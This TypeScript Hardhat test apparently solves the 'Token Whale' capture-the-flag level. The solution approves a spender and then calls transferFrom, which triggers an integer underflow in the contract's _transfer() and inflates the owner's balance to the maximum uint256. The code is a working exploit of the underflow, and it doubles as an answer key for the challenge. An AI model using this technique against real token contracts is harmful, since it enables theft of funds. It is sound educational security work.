import { SignerWithAddress as HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { expect } from "chai";
import hre from "hardhat";

import { TokenWhaleChallenge, TokenWhaleChallenge__factory } from "../typechain-types";

describe("10. Math -> Token Whale", function () {
  let owner: HardhatEthersSigner;
  let player: HardhatEthersSigner;
  let level: TokenWhaleChallenge;

  beforeEach(async function () {
    [owner, player] = await hre.ethers.getSigners();
    player;

    const factory: TokenWhaleChallenge__factory = new TokenWhaleChallenge__factory(owner);
    level = await factory.deploy(await player.getAddress());
    await level.waitForDeployment();
  });

  it("should be completed", async function () {
    expect(await level.balanceOf(player)).to.be.eq(1000);

    // player approve owner to spend player's tokens
    const tx = await level.connect(player).approve(owner, 1000);
    await expect(tx).not.to.be.reverted;
    await tx.wait();

    // owner transfers player's tokens to other address
    // here is underflow occured in the _transfer() function, and owner's balance becomes type(uint256).max
    const tx1 = await level.connect(owner).transferFrom(player, hre.ethers.ZeroAddress, 1);
    await expect(tx1).not.to.be.reverted;
    await tx1.wait();

    expect(await level.balanceOf(owner)).to.be.eq(hre.ethers.MaxUint256);

    // to fullfill level requirements, send 1M tokens to player
    const tx2 = await level.connect(owner).transfer(player, 1_000_000);
    await expect(tx2).not.to.be.reverted;
    await tx2.wait();

    expect(await level.isComplete()).to.be.true;
  });
});
